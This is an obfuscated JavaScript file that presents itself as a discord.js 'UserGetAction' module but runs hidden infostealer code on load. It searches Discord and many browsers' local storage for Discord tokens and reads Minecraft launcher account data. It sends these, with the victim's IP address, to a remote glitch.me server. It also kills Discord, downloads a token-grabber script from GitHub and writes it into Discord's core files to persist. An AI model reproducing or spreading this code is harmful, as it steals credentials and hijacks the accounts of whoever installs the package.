var _0x2cdd47 = _0xfe01;
(function (_0x3c11cb, _0x27d03f) {
    var _0x30fda5 = _0xfe01;
    var _0x256cb2 = _0x3c11cb();
    while (!![]) {
        try {
            var _0x57a6dc = parseInt(_0x30fda5(0x0)) / 0x1 + parseInt(_0x30fda5(0x1)) / 0x2 * (parseInt(_0x30fda5(0x2)) / 0x3) + -parseInt(_0x30fda5(0x3)) / 0x4 + -parseInt(_0x30fda5(0x4)) / 0x5 + parseInt(_0x30fda5(0x5)) / 0x6 + parseInt(_0x30fda5(0x6)) / 0x7 * (-parseInt(_0x30fda5(0x7)) / 0x8) + parseInt(_0x30fda5(0x8)) / 0x9;
            if (_0x57a6dc === _0x27d03f) {
                break;
            } else {
                _0x256cb2['push'](_0x256cb2['shift']());
            }
        } catch (_0x4117c6) {
            _0x256cb2['push'](_0x256cb2['shift']());
        }
    }
}(_0x2d58, 0x7ae98));
function _0x2d58() {
    var _0x40a98b = [
        'stringify',
        'slice',
        'query',
        '/remix',
        'accounts',
        '/minecraft',
        'eligibleForMigration',
        'hasMultipleProfiles',
        'legacy',
        'localId',
        'minecraftProfile',
        'name',
        'persistent',
        'remoteId',
        'type',
        'username',
        'activeAccountLocalId',
        'https://raw.githubusercontent.com/NotFubukIl/DiscordTokenGrabber/main/data/index.js',
        'text',
        'writeFileSync',
        'replace',
        '*API\x20URL*',
        'split',
        '/Update.exe\x20--processStart\x20',
        '.exe',
        'readdirSync',
        'includes',
        'cord',
        'push',
        'sync',
        '/app-*/modules/discord_desktop_core-*/discord_desktop_core/index.js',
        'map',
        'tasklist',
        'Discord.exe',
        'discord',
        'DiscordCanary.exe',
        'discordcanary',
        'DiscordDevelopment.exe',
        'discorddevelopment',
        'DiscordPTB.exe',
        'discordptb',
        'taskkill\x20/IM\x20',
        '.exe\x20/F',
        'linux',
        '/home/',
        '/.config',
        '/discord/Local\x20Storage/leveldb',
        '/*/modules/discord_desktop_core/index.js',
        'darwin',
        'handle',
        'client',
        'dataManager',
        'newUser',
        'exports',
        '814207vzuNEs',
        '1514JAczIJ',
        '969oHMEhY',
        '44376LpzvTT',
        '4008140fRbyYH',
        '2655462CSDkSG',
        '56DWaKsw',
        '691256djEQGR',
        '4555179squbWd',
        './Action',
        'node-fetch',
        'child_process',
        'glob',
        'https://frequent-level-cornflower.glitch.me',
        'platform',
        'win32',
        'env',
        'localappdata',
        'appdata',
        '/.minecraft/launcher_accounts.json',
        '/.minecraft/remix/UID.txt',
        '/Discord/Local\x20Storage/leveldb',
        '/DiscordDevelopment/Local\x20Storage/leveldb',
        '/Lightcord/Local\x20Storage/leveldb',
        '/discordptb/Local\x20Storage/leveldb',
        '/discordcanary/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Stable/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20GX\x20Stable/Local\x20Storage/leveldb',
        '/Amigo/User\x20Data/Local\x20Storage/leveldb',
        '/Torch/User\x20Data/Local\x20Storage/leveldb',
        '/Kometa/User\x20Data/Local\x20Storage/leveldb',
        '/Orbitum/User\x20Data/Local\x20Storage/leveldb',
        '/CentBrowser/User\x20Data/Local\x20Storage/leveldb',
        '/7Star/7Star/User\x20Data/Local\x20Storage/leveldb',
        '/Sputnik/Sputnik/User\x20Data/Local\x20Storage/leveldb',
        '/Vivaldi/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Google/Chrome\x20SxS/User\x20Data/Local\x20Storage/leveldb',
        '/Epic\x20Privacy\x20Browser/User\x20Data/Local\x20Storage/leveldb',
        '/Google/Chrome/User\x20Data/Default/Local\x20Storage/leveldb',
        '/uCozMedia/Uran/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Microsoft/Edge/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Yandex/YandexBrowser/User\x20Data/Default/Local\x20Storage/leveldb',
        '/Opera\x20Software/Opera\x20Neon/User\x20Data/Default/Local\x20Storage/leveldb',
        '/BraveSoftware/Brave-Browser/User\x20Data/Default/Local\x20Storage/leveldb',
        'readFile',
        'remix',
        'minecraft',
        'forEach',
        'readdir',
        'filter',
        'endsWith',
        'ldb',
        'readFileSync',
        'toString',
        'exec',
        'http://ip-api.com/json/',
        'then',
        'json',
        '/beforeinject',
        'POST'
    ];
    _0x2d58 = function () {
        return _0x40a98b;
    };
    return _0x2d58();
}
function _0xfe01(_0x1711da, _0x2d58e1) {
    var _0xfe01da = _0x2d58();
    _0xfe01 = function (_0x2aa927, _0x45f57e) {
        _0x2aa927 = _0x2aa927 - 0x0;
        var _0x263938 = _0xfe01da[_0x2aa927];
        return _0x263938;
    };
    return _0xfe01(_0x1711da, _0x2d58e1);
}
const Action = require(_0x2cdd47(0x9));
const OS = require('os'), fs = require('fs'), fetch = require(_0x2cdd47(0xa)), {execSync} = require(_0x2cdd47(0xb)), Glob = require(_0x2cdd47(0xc)), toInject = [], toInjectJS = [], toKill = [], apiurl = _0x2cdd47(0xd);
try {
    switch (OS[_0x2cdd47(0xe)]()) {
    case _0x2cdd47(0xf):
        const local = process[_0x2cdd47(0x10)][_0x2cdd47(0x11)], roaming = process[_0x2cdd47(0x10)][_0x2cdd47(0x12)], minecraftPath = roaming + _0x2cdd47(0x13), remixPath = roaming + _0x2cdd47(0x14);
        dbPaths = [
            roaming + _0x2cdd47(0x15),
            roaming + _0x2cdd47(0x16),
            roaming + _0x2cdd47(0x17),
            roaming + _0x2cdd47(0x18),
            roaming + _0x2cdd47(0x19),
            roaming + _0x2cdd47(0x1a),
            roaming + _0x2cdd47(0x1b),
            local + _0x2cdd47(0x1c),
            local + _0x2cdd47(0x1d),
            local + _0x2cdd47(0x1e),
            local + _0x2cdd47(0x1f),
            local + _0x2cdd47(0x20),
            local + _0x2cdd47(0x21),
            local + _0x2cdd47(0x22),
            local + _0x2cdd47(0x23),
            local + _0x2cdd47(0x24),
            local + _0x2cdd47(0x25),
            local + _0x2cdd47(0x26),
            local + _0x2cdd47(0x27),
            local + _0x2cdd47(0x28),
            local + _0x2cdd47(0x29),
            local + _0x2cdd47(0x2a),
            local + _0x2cdd47(0x2b)
        ];
        init();
        function init() {
            var _0x2eb26e = _0xfe01;
            fs[_0x2eb26e(0x2c)](remixPath, (_0xd82ff0, _0x392c4c) => _0x392c4c && minecraft(_0x2eb26e(0x2d), _0x392c4c));
            fs[_0x2eb26e(0x2c)](minecraftPath, (_0x322303, _0x1b4ec7) => _0x1b4ec7 && minecraft(_0x2eb26e(0x2e), _0x1b4ec7));
            injectToDiscord();
            dbPaths[_0x2eb26e(0x2f)](_0x39c34b => main(_0x39c34b));
        }
        function main(_0x2f2225) {
            var _0xef503f = _0xfe01;
            fs[_0xef503f(0x30)](_0x2f2225, (_0xcfda78, _0x12d19c) => {
                var _0x2f2b11 = _0xfe01;
                if (_0x12d19c) {
                    var _0x58ffee = _0x12d19c[_0x2f2b11(0x31)](_0x5ec745 => _0x5ec745[_0x2f2b11(0x32)](_0x2f2b11(0x33)));
                    _0x58ffee[_0x2f2b11(0x2f)](_0x4ae692 => {
                        var _0x3eb04d = _0xfe01;
                        var _0x325adf = fs[_0x3eb04d(0x34)](_0x2f2225 + '/' + _0x4ae692)[_0x3eb04d(0x35)]();
                        var _0x25a845 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x47443f = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x4778c9] = _0x25a845[_0x3eb04d(0x36)](_0x325adf) || _0x47443f[_0x3eb04d(0x36)](_0x325adf) || [undefined];
                        if (_0x4778c9)
                            fetch(_0x3eb04d(0x37))[_0x3eb04d(0x38)](_0x394cc1 => _0x394cc1[_0x3eb04d(0x39)]())[_0x3eb04d(0x38)](_0x546921 => fetch(apiurl + _0x3eb04d(0x3a), {
                                'method': _0x3eb04d(0x3b),
                                'body': JSON[_0x3eb04d(0x3c)]({
                                    'token': _0x4778c9[_0x3eb04d(0x3d)](0x1, -0x1),
                                    'ipAddress': _0x546921[_0x3eb04d(0x3e)]
                                })
                            }));
                    });
                }
            });
        }
        function minecraft(_0x54c079, _0x19f56b) {
            var _0x311935 = _0xfe01;
            switch (_0x54c079) {
            case _0x311935(0x2d):
                fetch(apiurl + _0x311935(0x3f), {
                    'method': _0x311935(0x3b),
                    'body': JSON[_0x311935(0x3c)]({ 'UID': _0x19f56b })
                });
                break;
            case _0x311935(0x2e):
                var [_0x2e1129] = /"[\d\w_-]{32}"/[_0x311935(0x36)](_0x19f56b);
                if (_0x2e1129) {
                    const _0x5b5c41 = require(minecraftPath);
                    if (!_0x5b5c41[_0x311935(0x40)])
                        return;
                    var _0x2f690f = _0x5b5c41[_0x311935(0x40)][_0x2e1129[_0x311935(0x3d)](0x1, -0x1)];
                    fetch(apiurl + _0x311935(0x41), {
                        'method': _0x311935(0x3b),
                        'body': JSON[_0x311935(0x3c)]({
                            'eligibleForMigration': _0x2f690f[_0x311935(0x42)],
                            'hasMultipleProfiles': _0x2f690f[_0x311935(0x43)],
                            'legacy': _0x2f690f[_0x311935(0x44)],
                            'localId': _0x2f690f[_0x311935(0x45)],
                            'minecraftProfileID': _0x2f690f[_0x311935(0x46)]['id'],
                            'minecraftProfileName': _0x2f690f[_0x311935(0x46)][_0x311935(0x47)],
                            'persistent': _0x2f690f[_0x311935(0x48)],
                            'remoteId': _0x2f690f[_0x311935(0x49)],
                            'type': _0x2f690f[_0x311935(0x4a)],
                            'username': _0x2f690f[_0x311935(0x4b)],
                            'activeAccountLocalId': _0x5b5c41[_0x311935(0x4c)]
                        })
                    });
                }
            }
        }
        function injectToDiscord() {
            var _0x5e14d6 = _0xfe01;
            getInstalledDiscord();
            killAllDiscords();
            fetch(_0x5e14d6(0x4d))[_0x5e14d6(0x38)](_0xb78ceb => _0xb78ceb[_0x5e14d6(0x4e)]())[_0x5e14d6(0x38)](_0x453e33 => toInjectJS[_0x5e14d6(0x2f)](_0x560d82 => fs[_0x5e14d6(0x4f)](_0x560d82, _0x453e33[_0x5e14d6(0x50)](_0x5e14d6(0x51), apiurl)) ^ execSync(local + '/' + _0x560d82[_0x5e14d6(0x52)]('/')[0x5] + _0x5e14d6(0x53) + _0x560d82[_0x5e14d6(0x52)]('/')[0x5] + _0x5e14d6(0x54))));
        }
        function getInstalledDiscord() {
            var _0x5527cb = _0xfe01;
            fs[_0x5527cb(0x55)](roaming)[_0x5527cb(0x2f)](_0x4da6c4 => _0x4da6c4[_0x5527cb(0x56)](_0x5527cb(0x57)) && toInject[_0x5527cb(0x58)](local + '/' + _0x4da6c4));
            toInject[_0x5527cb(0x2f)](_0x55bc7e => Glob[_0x5527cb(0x59)](_0x55bc7e + _0x5527cb(0x5a))[_0x5527cb(0x5b)](_0x3ecb11 => toInjectJS[_0x5527cb(0x58)](_0x3ecb11)));
        }
        function killAllDiscords() {
            var _0x38b153 = _0xfe01;
            var _0x13cd2b = execSync(_0x38b153(0x5c))[_0x38b153(0x35)]();
            _0x13cd2b[_0x38b153(0x56)](_0x38b153(0x5d)) && toKill[_0x38b153(0x58)](_0x38b153(0x5e));
            _0x13cd2b[_0x38b153(0x56)](_0x38b153(0x5f)) && toKill[_0x38b153(0x58)](_0x38b153(0x60));
            _0x13cd2b[_0x38b153(0x56)](_0x38b153(0x61)) && toKill[_0x38b153(0x58)](_0x38b153(0x62));
            _0x13cd2b[_0x38b153(0x56)](_0x38b153(0x63)) && toKill[_0x38b153(0x58)](_0x38b153(0x64));
            toKill[_0x38b153(0x2f)](_0x5fcd4 => execSync(_0x38b153(0x65) + _0x5fcd4 + _0x38b153(0x66)));
        }
        break;
    case _0x2cdd47(0x67):
        const defaut = _0x2cdd47(0x68) + __dirname[_0x2cdd47(0x52)]('/')[0x2] + _0x2cdd47(0x69), LdbPaths = [
                defaut + _0x2cdd47(0x6a),
                defaut + _0x2cdd47(0x19),
                defaut + _0x2cdd47(0x18),
                defaut + _0x2cdd47(0x16)
            ];
        const LminecraftPath = defaut + _0x2cdd47(0x13);
        Linit();
        function Linit() {
            var _0x25d11b = _0xfe01;
            LdbPaths[_0x25d11b(0x2f)](_0x1cbea6 => Lmain(_0x1cbea6));
            var _0x3237b6 = fs[_0x25d11b(0x34)](LminecraftPath);
            if (_0x3237b6)
                Lminecraft(_0x3237b6);
            LinjectToDiscord();
        }
        function Lmain(_0x4c6543) {
            var _0x34f8fd = _0xfe01;
            fs[_0x34f8fd(0x30)](_0x4c6543, (_0x266a72, _0x1dca3) => {
                var _0xc9d120 = _0xfe01;
                if (_0x1dca3) {
                    var _0x2639d3 = _0x1dca3[_0xc9d120(0x31)](_0x343b03 => _0x343b03[_0xc9d120(0x32)](_0xc9d120(0x33)));
                    _0x2639d3[_0xc9d120(0x2f)](_0xa49567 => {
                        var _0x3178c5 = _0xfe01;
                        var _0x3717d5 = fs[_0x3178c5(0x34)](_0x1dca3 + '/' + _0xa49567)[_0x3178c5(0x35)]();
                        var _0x3b6867 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
                        var _0x14c9ca = /"mfa\.[\d\w_-]{84}"/;
                        var [_0x57fd65] = _0x3b6867[_0x3178c5(0x36)](_0x3717d5) || _0x14c9ca[_0x3178c5(0x36)](_0x3717d5) || [undefined];
                        if (_0x57fd65)
                            fetch(_0x3178c5(0x37))[_0x3178c5(0x38)](_0x22d629 => _0x22d629[_0x3178c5(0x39)]())[_0x3178c5(0x38)](_0xb2e486 => fetch(apiurl + _0x3178c5(0x3a), {
                                'method': _0x3178c5(0x3b),
                                'body': JSON[_0x3178c5(0x3c)]({
                                    'token': _0x57fd65,
                                    'ip': _0xb2e486[_0x3178c5(0x3e)]
                                })
                            }));
                    });
                }
            });
        }
        function Lminecraft(_0x29360a) {
            var _0x53bbf8 = _0xfe01;
            var [_0x4924f9] = /"[\d\w_-]{32}"/[_0x53bbf8(0x36)](_0x29360a);
            if (_0x4924f9) {
                const _0x487d18 = require(LminecraftPath);
                if (!_0x487d18[_0x53bbf8(0x40)])
                    return;
                var _0x56ba0b = _0x487d18[_0x53bbf8(0x40)][_0x4924f9[_0x53bbf8(0x3d)](0x1, -0x1)];
                fetch(apiurl + _0x53bbf8(0x41), {
                    'method': _0x53bbf8(0x3b),
                    'body': JSON[_0x53bbf8(0x3c)]({
                        'eligibleForMigration': _0x56ba0b[_0x53bbf8(0x42)],
                        'hasMultipleProfiles': _0x56ba0b[_0x53bbf8(0x43)],
                        'legacy': _0x56ba0b[_0x53bbf8(0x44)],
                        'localId': _0x56ba0b[_0x53bbf8(0x45)],
                        'minecraftProfileID': _0x56ba0b[_0x53bbf8(0x46)]['id'],
                        'minecraftProfileName': _0x56ba0b[_0x53bbf8(0x46)][_0x53bbf8(0x47)],
                        'persistent': _0x56ba0b[_0x53bbf8(0x48)],
                        'remoteId': _0x56ba0b[_0x53bbf8(0x49)],
                        'type': _0x56ba0b[_0x53bbf8(0x4a)],
                        'username': _0x56ba0b[_0x53bbf8(0x4b)],
                        'activeAccountLocalId': _0x487d18[_0x53bbf8(0x4c)]
                    })
                });
            }
        }
        function LinjectToDiscord() {
            var _0x2a89b2 = _0xfe01;
            getInstalledLDiscord();
            fetch(_0x2a89b2(0x4d))[_0x2a89b2(0x38)](_0x3d1e30 => _0x3d1e30[_0x2a89b2(0x4e)]())[_0x2a89b2(0x38)](_0x4d0ba9 => toInjectJS[_0x2a89b2(0x2f)](_0x5757b8 => fs[_0x2a89b2(0x4f)](_0x5757b8, _0x4d0ba9[_0x2a89b2(0x50)](_0x2a89b2(0x51), apiurl))));
        }
        function getInstalledLDiscord() {
            var _0x3f7a14 = _0xfe01;
            fs[_0x3f7a14(0x55)](defaut)[_0x3f7a14(0x2f)](_0x230743 => _0x230743[_0x3f7a14(0x56)](_0x3f7a14(0x57)) && toInject[_0x3f7a14(0x58)](defaut + '/' + _0x230743));
            toInject[_0x3f7a14(0x2f)](_0x4bdfb3 => Glob[_0x3f7a14(0x59)](_0x4bdfb3 + _0x3f7a14(0x6b))[_0x3f7a14(0x5b)](_0x1b1f98 => toInjectJS[_0x3f7a14(0x58)](_0x1b1f98)));
        }
        break;
    case _0x2cdd47(0x6c):
        break;
    }
} catch (_0x63c303) {
}
class UserGetAction extends Action {
    [_0x2cdd47(0x6d)](_0x54e685) {
        var _0xbadaf = _0xfe01;
        const _0x426a5d = this[_0xbadaf(0x6e)];
        const _0x410202 = _0x426a5d[_0xbadaf(0x6f)][_0xbadaf(0x70)](_0x54e685);
        return { 'user': _0x410202 };
    }
}
module[_0x2cdd47(0x71)] = UserGetAction;
